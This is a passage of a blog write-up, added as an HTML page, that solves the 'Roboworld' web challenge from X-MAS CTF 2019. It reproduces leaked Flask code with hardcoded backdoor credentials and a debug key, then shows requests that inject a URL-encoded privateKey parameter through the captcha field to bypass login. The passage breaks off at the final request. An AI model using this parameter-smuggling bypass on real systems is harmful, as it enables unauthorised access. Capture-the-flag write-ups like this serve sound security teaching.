@@ -1,0 +1,622 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@1.207/distr/fira_code.css">
+
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="/theme/stylesheet/style.min.css">
+
+  <link rel="stylesheet" type="text/css" href="/theme/pygments/rrt.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/solid.css">
+
+
+    <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="securitytaters Atom">
+
+
+
+
+
+<meta name="author" content="0xm4v3rick" />
+<meta name="description" content="Solving this ctf was quite a fun for me. Go ahead to read about it." />
+<meta name="keywords" content="webappsec, auth bypass, writeup">
+
+
+<meta property="og:site_name" content="securitytaters"/>
+<meta property="og:title" content="Solving Roboworld from X-MAS CTF 2019"/>
+<meta property="og:description" content="Solving this ctf was quite a fun for me. Go ahead to read about it."/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="/solving-roboworld-from-x-mas-ctf-2019.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2019-12-21 13:01:00+05:30"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="/author/0xm4v3rick.html">
+<meta property="article:section" content="CTF"/>
+<meta property="article:tag" content="webappsec"/>
+<meta property="article:tag" content="auth bypass"/>
+<meta property="article:tag" content="writeup"/>
+<meta property="og:image" content="">
+
+  <title>securitytaters &ndash; Solving Roboworld from X-MAS CTF 2019</title>
+
+</head>
+<body>
+  <aside>
+    <div id='blah'>
+
+<h1><a style="font-weight:bold;font-size:xx-large" href="https://securitytaters.info">securitytaters</a></h1>
+<hr>
+    </div>
+
+    <div style="margin-top: -90px;">
+      <h1><a href=""></a></h1>
+
+
+      <nav>
+        <ul class="list">
+
+	<h2>0xm4v3rick</h2>
+            <li><a target="_blank" href="https://twitter.com/0xm4v3rick" >Twitter</a></li>
+            <li><a target="_blank" href="https://github.com/0xm4v3rick" >Github</a></li>
+
+	<h2>0xshrimantyogi</h2>
+            <li><a target="_blank" href="https://twitter.com/0xshrimantyogi" >Twitter</a></li>
+            <li><a target="_blank" href="https://github.com/0xshrimantyogi" >Github</a></li>
+
+        </ul>
+      </nav>
+
+      <ul class="social">
+          <li>
+            <a  class="sc-Git" href="#" target="_blank">
+            <i class="fab fa-Git">
+            </i>
+
+          </a></li>
+          <li>
+            <a  class="sc-Another social link" href="#" target="_blank">
+            <i class="fab fa-Another social link">
+            </i>
+
+          </a></li>
+      </ul>
+ 					<h2><a href="/archives.html">Archives</a></h2> <br/>
+					<h2><a href="/authors.html">Authors</a></h2>
+</br>
+<h3 style="color: #00ff28;"><b>This site uses Fira Code so the code will not appear as usual but it will work if you copy and use it directly.</b></h3>
+    </div>
+
+
+  </aside>
+  <main>
+
+
+<article class="single">
+  <header>
+      
+    <h1 id="solving-roboworld-from-x-mas-ctf-2019">Solving Roboworld from X-MAS CTF 2019</h1>
+    <p>
+          Posted on Sat 21 December 2019 in <a href="/category/ctf.html">CTF</a>
+
+by <a href="0xm4v3rick.html">0xm4v3rick</a>
+    </p>
+  </header>
+<hr>
+
+  <div>
+    <p>The author note for this CTF challenge.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">A friend of mine told me about this website where I can find secret cool stuff. He even managed to leak a part of the source code for me, but when I try to login it always fails :(  </span>
+<span class="err">Can you figure out what&#39;s wrong and access the secret files?  </span>
+<span class="err">Remote server: http://challs.xmas.htsp.ro:11000  </span>
+<span class="c">Files: leak.py  </span>
+<span class="c">Author: Reda</span>
+</pre></div>
+</td></tr></table>
+
+<p>Lets look at the things we have. Browsing through the remote server URL gives you a login page as shown below. Looks like we may have to bypass the login.</p>
+<p><img alt="login" src="img/1.1.jpg" /></p>
+<p>The login request generated from above page is as follows. Note the captcha value sent along with credentials at line 14.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">challs.xmas.htsp.ro:11000</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">57</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://challs.xmas.htsp.ro:11000</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://challs.xmas.htsp.ro:11000/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+<span class="hll">user=test&amp;pass=test&amp;captcha_verification_value=19OaI9eSj2
+</span></pre></div>
+</td></tr></table>
+
+<p>The leak.py source provided shows what the backend looks like. Lets go through it in brief to better understand the situation.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">redirect</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">captcha</span> <span class="kn">import</span> <span class="n">verifyCaptchaValue</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;index.html&quot;</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;pass&#39;</span><span class="p">)</span>
+    <span class="n">captchaToken</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;captcha_verification_value&#39;</span><span class="p">)</span>
+
+    <span class="n">privKey</span> <span class="o">=</span> <span class="s2">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span> <span class="c1">#redacted</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:{}/captchaVerify?captchaUserValue={}&amp;privateKey={}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">),</span> <span class="n">captchaToken</span><span class="p">,</span> <span class="n">privKey</span><span class="p">))</span>
+    <span class="c1">#backdoored ;)))</span>
+    <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="s2">&quot;backd00r&quot;</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="s2">&quot;catsrcool&quot;</span> <span class="ow">and</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;allow&#39;</span><span class="p">:</span>
+        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;logged&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;//redacted//&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&quot;login failed&quot;</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/captchaVerify&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">captchaVerify</span><span class="p">():</span>
+    <span class="c1">#only 127.0.0.1 has access</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">!=</span> <span class="s2">&quot;127.0.0.1&quot;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&quot;Access denied&quot;</span>
+
+    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;captchaUserValue&#39;</span><span class="p">)</span>
+    <span class="n">privKey</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;privateKey&#39;</span><span class="p">)</span>
+    <span class="c1">#TODO: remove debugging privkey for testing: 8EE86735658A9CE426EAF4E26BB0450E from captcha verification system</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">verifyCaptchaValue</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">privKey</span><span class="p">)):</span>
+        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="s2">&quot;allow&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="s2">&quot;deny&quot;</span><span class="p">)</span>
+</pre></div>
+</td></tr></table>
+
+<ul>
+<li><strong>Line 1-4</strong> : are the imports required for the flask program to work. After searching the internet, <strong>verifyCaptchaValue</strong> seems like a custom function.  </li>
+<li><strong>Line 6</strong> : creates and instance of Flask app.  </li>
+<li><strong>Line 8-10</strong> : defines a function to execute when root directory is accessed. In this case index.html will be served.  </li>
+<li><strong>Line 12-25</strong> : defines a function to execute when <strong>login</strong> API is accessed. It takes 3 parameters from the POST request(line 14-16). Line 18 has privKey redacted so we will need to make do without it. Line 19 creates a GET request to localhost with <strong>captchaToken</strong> and <strong>privKey</strong> which as the name suggests will verify the captcha. Line 21 shows hardcoded credentials which is never a good idea. So the logic checks if the user is <strong>backd00r</strong>,password is <strong>catsrcool</strong> and r.content is <strong>allow</strong>. If all three match than the session is granted and redirection happens to redacted page on line 23 else the login fails.   </li>
+<li><strong>Line 28-40</strong> : defines a function for <strong>captchaVerify</strong> API. Line 31 checks if the IP address from which the request came is 127.0.0.1. If not access is denied. Line 34-35 takes 2 parameters from the request which would be used further. Line 36 has an interesting comment about a privatekey used for testing the captcha verification system. Line 37 verifies the captch with <strong>privKey</strong> and <strong>token</strong> and returns allow or deny accordingly.  </li>
+</ul>
+<p>Now that we have good idea of what is happening at the backend we can confirm that the login needs to be bypassed and we can plan to do so. We already have the hardcoded credentials. Only thing we need to do is somehow make the value of r.content as allow. That would happen when we provide the right privKey and token to the <strong>verifyCaptchaValue</strong>. </p>
+<p>With that in mind I started with <strong>captchaVerify</strong> to see how it behaves as figuring that is the key to solving the challenge. It seems that we could query the API from outside even though the code suggests that only localhost can access it. We use the arguments that it expects and send a GET request with debugging privkey and captch from the login request.<br />
+Side note: Its always good to verify the code by testing it as the code you have may not be the same as that on the server due to various reasons.</p>
+<p>Request:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/captchaVerify?captchaUserValue=19OaI9eSj2&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">challs.xmas.htsp.ro:11000</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://challs.xmas.htsp.ro:11000</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://challs.xmas.htsp.ro:11000/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</pre></div>
+</td></tr></table>
+
+<p>Response:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6
+7
+8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">HTTP</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span> <span class="nt">200</span> <span class="nt">OK</span>
+<span class="nt">Server</span><span class="o">:</span> <span class="nt">nginx</span>
+<span class="nt">Date</span><span class="o">:</span> <span class="nt">Thu</span><span class="o">,</span> <span class="nt">19</span> <span class="nt">Dec</span> <span class="nt">2019</span> <span class="nt">10</span><span class="p">:</span><span class="nd">10</span><span class="p">:</span><span class="nd">13</span> <span class="nt">GMT</span>
+<span class="nt">Content-Type</span><span class="o">:</span> <span class="nt">text</span><span class="o">/</span><span class="nt">html</span><span class="o">;</span> <span class="nt">charset</span><span class="o">=</span><span class="nt">utf-8</span>
+<span class="nt">Content-Length</span><span class="o">:</span> <span class="nt">5</span>
+<span class="nt">Connection</span><span class="o">:</span> <span class="nt">close</span>
+
+<span class="nt">allow</span>
+</pre></div>
+</td></tr></table>
+
+<p>Now that we have checked that the test privKey is still working, we need to figure out what can be done about captcha value as that needs to match to pass the verification. Lets check to see how the captcha is generated. Looking through the view-source on login the page we see more developer comments :D.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">function</span> <span class="nx">captchaGenerateVerificationValue</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="c1">//Devnote:</span>
+        <span class="c1">//Oops I broke the captcha verification function</span>
+        <span class="c1">//so it will just generate random stuff for the verification value</span>
+        <span class="c1">//hope no one notices :O</span>
+
+        <span class="kd">var</span> <span class="nx">characters</span>       <span class="o">=</span> <span class="s1">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">charactersLength</span> <span class="o">=</span> <span class="nx">characters</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+        <span class="nx">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+        <span class="k">for</span> <span class="p">(</span> <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="nx">result</span> <span class="o">+=</span> <span class="nx">characters</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">charactersLength</span><span class="p">));</span>
+        <span class="p">}</span>
+
+        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;captcha&quot;</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">result</span>
+    <span class="p">}</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+
+Login:
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/login&quot;</span><span class="p">&gt;</span>
+    Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;user&quot;</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+    Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;pass&quot;</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+    Captcha: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;captcha&quot;</span> <span class="na">onchange</span><span class="o">=</span><span class="s">&quot;captchaGenerateVerificationValue()&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;checkbox&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;captcha_verification_value&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;</span> I am not a robot <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</pre></div>
+</td></tr></table>
+
+<p>As can be seen from the <strong>Devnote</strong> and the <strong>captchaGenerateVerificationValue</strong> function, the captcha verification seems to be broken and a random value is generated, which probably means it wont be checked at the backend. Lets try it out. Sending a random value instead of captcha does not make any difference and we pass the verification.  </p>
+<p>Request</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/captchaVerify?captchaUserValue=random&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">challs.xmas.htsp.ro:11000</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://challs.xmas.htsp.ro:11000</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://challs.xmas.htsp.ro:11000/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</pre></div>
+</td></tr></table>
+
+<p>Response</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6
+7
+8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">HTTP</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span> <span class="nt">200</span> <span class="nt">OK</span>
+<span class="nt">Server</span><span class="o">:</span> <span class="nt">nginx</span>
+<span class="nt">Date</span><span class="o">:</span> <span class="nt">Thu</span><span class="o">,</span> <span class="nt">19</span> <span class="nt">Dec</span> <span class="nt">2019</span> <span class="nt">11</span><span class="p">:</span><span class="nd">00</span><span class="p">:</span><span class="nd">01</span> <span class="nt">GMT</span>
+<span class="nt">Content-Type</span><span class="o">:</span> <span class="nt">text</span><span class="o">/</span><span class="nt">html</span><span class="o">;</span> <span class="nt">charset</span><span class="o">=</span><span class="nt">utf-8</span>
+<span class="nt">Content-Length</span><span class="o">:</span> <span class="nt">5</span>
+<span class="nt">Connection</span><span class="o">:</span> <span class="nt">close</span>
+
+<span class="nt">allow</span>
+</pre></div>
+</td></tr></table>
+
+<p>It is also important to note that the server honours the first occurance of <strong>privateKey</strong> as that will be useful during exploitation. Hence below request would still pass the verification.  </p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">GET /captchaVerify?captchaUserValue=random&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E&amp;privateKey=1</span>
+</pre></div>
+</td></tr></table>
+
+<p>This allows us to set the captcha value to whatever we want so that we can manipulate the login request as that too contains the captcha value. I decided to try this out on local setup instead of beating on the CTF server as I have the source code available. Below is the changed code to try and replicate the backend.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">redirect</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="c1">#from captcha import verifyCaptchaValue</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;index.html&quot;</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">username</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;pass&#39;</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">password</span>
+    <span class="n">captchaToken</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;captcha_verification_value&#39;</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">captchaToken</span>
+    <span class="n">privKey</span> <span class="o">=</span> <span class="s2">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span> <span class="c1">#redacted</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:{}/captchaVerify?captchaUserValue={}&amp;privateKey={}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">),</span> <span class="n">captchaToken</span><span class="p">,</span> <span class="n">privKey</span><span class="p">))</span>
+    <span class="c1">#backdoored ;)))</span>
+    <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="s2">&quot;backd00r&quot;</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="s2">&quot;catsrcool&quot;</span> <span class="ow">and</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;allow&#39;</span><span class="p">:</span>
+        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;logged&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;//redacted//&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&quot;login failed&quot;</span>
+
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">@app.route(&#39;/captchaVerify&#39;)</span>
+<span class="sd">def captchaVerify():</span>
+<span class="sd">    #only 127.0.0.1 has access</span>
+<span class="sd">    if request.remote_addr != &quot;127.0.0.1&quot;:</span>
+<span class="sd">        return &quot;Access denied&quot;</span>
+
+<span class="sd">    token = request.args.get(&#39;captchaUserValue&#39;)</span>
+<span class="sd">    privKey = request.args.get(&#39;privateKey&#39;)</span>
+<span class="sd">    #TODO: remove debugging privkey for testing: 8EE86735658A9CE426EAF4E26BB0450E from captcha verification system</span>
+<span class="sd">    if(verifyCaptchaValue(token, privKey)):</span>
+<span class="sd">        return str(&quot;allow&quot;)</span>
+<span class="sd">    else:</span>
+<span class="sd">        return str(&quot;deny&quot;)</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</pre></div>
+</td></tr></table>
+
+<p>The idea here is to manipulate the <strong>captcha_verification_value</strong> from the login request so that it will end up in <strong>captchaUserValue</strong> in line 22 above. That will allow us to utilize the vulnerability in captach verification and bypass the login. So a login payload of</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">user=backd00r&amp;pass=catsrcool&amp;captcha_verification_value=random&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E</span>
+</pre></div>
+</td></tr></table>
+
+<p>results into the GET request as below</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">/captchaVerify?captchaUserValue=random&amp;privateKey=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre></div>
+</td></tr></table>
+
+<p>We do not see the privateKey that we had passed. After some trial and errors the final login request looks like below. We need to URL encode the <strong>&amp;</strong> to make it parsable in post login request and visible in GET request later.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">challs.xmas.htsp.ro:11000</span>
